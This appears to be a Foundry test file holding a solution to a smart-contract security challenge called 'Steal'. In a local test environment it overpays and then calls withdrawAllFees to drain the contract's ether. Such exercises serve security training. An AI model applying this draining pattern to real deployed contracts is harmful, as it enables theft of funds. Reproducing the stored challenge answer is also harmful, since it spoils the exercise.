// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Steal} from "src/exploits/steal/Steal.sol";

contract StealChallenge is Test {
    Steal challenge;

    address challenger = makeAddr("challenger");

    function setUp() public {
        vm.deal(challenger, 1 ether);
        vm.prank(challenger);
        challenge = new Steal{value: 0.02 ether}();
    }

    function testPreCheck() public view {
        assertEq(address(challenge).balance, 0.02 ether);
    }

    function testDrainPool() public {
        uint256 startingBalance = address(challenge).balance;
        uint256 registrationFee = 0.01 ether;

        //Can Register
        vm.startPrank(challenger);
        challenge.register{value: registrationFee}();
        vm.stopPrank();
        assertEq(address(challenge).balance, registrationFee + startingBalance);

        //CODE YOUR SOLUTION HERE
        vm.startPrank(challenger);
        payable(address(challenge)).call{value: registrationFee * 6}("");
        challenge.withdrawAllFees();
        vm.stopPrank();
        assertEq(address(challenge).balance, 0);
    }
}
